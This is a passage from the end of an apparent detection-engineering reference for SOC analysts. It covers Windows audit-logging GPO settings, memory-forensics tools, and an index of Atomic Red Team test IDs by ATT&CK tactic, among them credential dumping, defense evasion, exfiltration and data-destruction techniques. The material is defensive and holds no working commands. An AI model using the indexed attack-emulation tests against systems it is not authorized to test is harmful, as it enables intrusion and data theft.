3. **EDR/XDR:** Behavioral analysis and automated response
4. **Memory Forensics:** Volatility, pe-sieve, Moneta for incident response

## Logging Requirements GPO Configuration
```
Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy:
- Audit Process Creation: Success
- Audit Logon: Success, Failure
- Audit Kerberos Authentication Service: Success, Failure
- Audit Kerberos Service Ticket Operations: Success, Failure
- Audit Directory Service Access: Success
- Audit Object Access: Success

Administrative Templates:
- Include command line in process creation events: Enabled
- Turn on PowerShell Script Block Logging: Enabled
- Turn on PowerShell Module Logging: Enabled
```

---

# Atomic Red Team Test Index by Tactic

| Tactic | Key Test IDs |
|--------|--------------|
| Initial Access | T1566.001-1, T1566.002-1, T1190-1, T1078-1 |
| Execution | T1059.001-1, T1059.003-1, T1047-1, T1053.005-1, T1569.002-1 |
| Persistence | T1547.001-1, T1546.003-1, T1543.003-1, T1505.003-1 |
| Privilege Escalation | T1055.001-1, T1055.012-1, T1548.002-1, T1068-1 |
| Defense Evasion | T1027-1, T1562.001-1, T1070.001-1, T1218.011-1 |
| Credential Access | T1003.001-1, T1558-1, T1110-1, T1557-1 |
| Discovery | T1087-1, T1082-1, T1046-1, T1482-1 |
| Lateral Movement | T1021.001-1, T1021.002-1, T1550.002-1, T1570-1 |
| Collection | T1560.001-1, T1113-1, T1114-1, T1115-1 |
| C2 | T1071.001-1, T1071.004-1, T1572-1, T1105-1 |
| Exfiltration | T1041-1, T1048-1, T1567.002-1, T1020-1 |
| Impact | T1486-1, T1489-1, T1490-1, T1485-1 |

---

# Document Classification

**Classification:** UNCLASSIFIED // FOR OFFICIAL USE ONLY

**Purpose:** Detection engineering and threat hunting reference for DoD SOC analysts

**Coverage:** 120 MITRE ATT&CK techniques across 12 tactical categories

**Sources:** MITRE ATT&CK v18, Atomic Red Team, SigmaHQ, Red Canary, CISA advisories, Elastic Security, Mandiant/CrowdStrike threat intelligence, SpecterOps research, LOLBAS Project

**Revision Date:** January 2026